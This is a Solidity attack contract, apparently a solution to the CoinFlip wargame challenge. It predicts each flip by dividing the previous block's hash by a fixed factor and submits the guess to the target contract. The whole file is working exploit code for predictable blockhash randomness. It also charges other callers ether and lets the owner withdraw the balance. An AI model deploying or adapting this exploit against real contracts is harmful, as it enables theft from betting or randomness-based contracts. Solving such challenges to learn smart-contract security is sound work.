pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";

contract CoinFlipAttack {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address public owner;

    event FlipResult(bool result, uint256 consecutiveWins);

    constructor() {
        owner = msg.sender;
    }

    function flip(CoinFlip coin) payable public {
        if (msg.sender != owner) {
            require(msg.value > 0.01 ether);
        }

        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool guess = coinFlip == 1 ? true : false;

        bool result = coin.flip(guess);

        emit FlipResult(result, coin.consecutiveWins());
    }

    receive() external payable {}

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }
}